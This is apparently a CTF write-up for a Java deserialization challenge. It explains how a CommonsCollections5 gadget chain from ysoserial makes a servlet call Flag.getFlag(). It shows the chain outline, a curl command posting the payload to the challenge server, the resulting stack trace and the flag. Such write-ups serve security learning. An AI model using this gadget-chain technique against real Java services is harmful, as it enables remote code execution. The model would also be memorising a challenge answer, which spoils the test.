# Misc 300

The flag marshal has falsely imprisoned a flag for being a deserial killer. Your mission is simple, break the flag out of the marshal's jail (http://theflagmarshal.us-east-1.elasticbeanstalk.com/). In addition to the bad puns, you seem to have stumbled upon another clue, blueprint.war.

# Analysis

You are given a Java servlet that receives data sent via POST request, deserializes it and converts to a Person object. However, sending the data normally won't get you the flag. You need to find a way around that to get the flag (from the [Flag class](Flag.java))

After decompiling the classes and inspecting them, here are the bits of information you need to solve the challenge:
* If there is an error in deserialization, the exception is thrown back to the client
* Flag can be retrieved by an exception thrown from Flag.getFlag().
* So the goal is to send a payload that invokes Flag.getFlag() when deserialized. This is not a simple task.
* To make things tougher for everyone, CustomOIS has been designed to only accept some certain classes in the invocation chain (see [CustomOIS.java](CustomOIS.java))

# Solution

Deserialization vulnerabilities have been used a lot recently in CTFs, however they are mostly in Python (probably due to the fact that many players use Python nowadays). That doesn't mean Java vulnerabilities have not been researched. In fact, there have been many publications about them:
* [OWASP - Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
* [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [Blind Java Deserialization Vulnerability - Commons Gadgets](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [ysoserial - A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)

Now it's clear what to do. Although the description is a bit misleading, [ysoserial's CommonsCollections5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java) can be used to build the gadget chain, something like this:

```
ObjectInputStream.readObject()
  BadAttributeValueExpException.toString()
    TiedMapEntry.toString()
      LazyMap.get()
        ChainedTransformer.transform()
        ConstantTransformer.transform()
        InvokerTransformer.transform()
          Method.invoke()
            Class.getMethod()
        InvokerTransformer.transform()
          Method.invoke()
            Flag.getFlag()
```
*(Some of the method names might be wrong, but it doesn't matter - you get the idea)*

Full code to generate the payload: [FlagWriter.java](FlagWriter.java)

Now just send the payload to the server and the flag is thrown in exception:
```
C:\ctf_tools\curl-7.61.1-win64-mingw\bin>curl --data-binary @"MyFlag.bin" http://theflagmarshal.us-east-1.elasticbeanstalk.com/jail
org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'invoke' on 'class java.lang.reflect.Method' threw an exception
        at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
        at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
        at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
        at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)
        at org.apache.commons.collections.keyvalue.TiedMapEntry.toString(TiedMapEntry.java:131)
        at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)
        at sun.reflect.GeneratedMethodAccessor24.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1170)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2177)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:430)
        at com.trendmicro.Server.doPost(Server.java:31)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:661)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:742)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)
        at org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:685)
        at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
        at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)
        at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
        at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:800)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1471)
        at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.reflect.InvocationTargetException
        at sun.reflect.GeneratedMethodAccessor27.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:125)
        ... 39 more
Caused by: java.lang.reflect.InvocationTargetException
        at sun.reflect.GeneratedMethodAccessor26.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        ... 43 more
Caused by: java.lang.Exception: TMCTF{15nuck9astTheF1agMarsha12day}
        at com.trendmicro.jail.Flag.getFlag(Flag.java:10)
        ... 46 more
```

Flag is **TMCTF{15nuck9astTheF1agMarsha12day}**

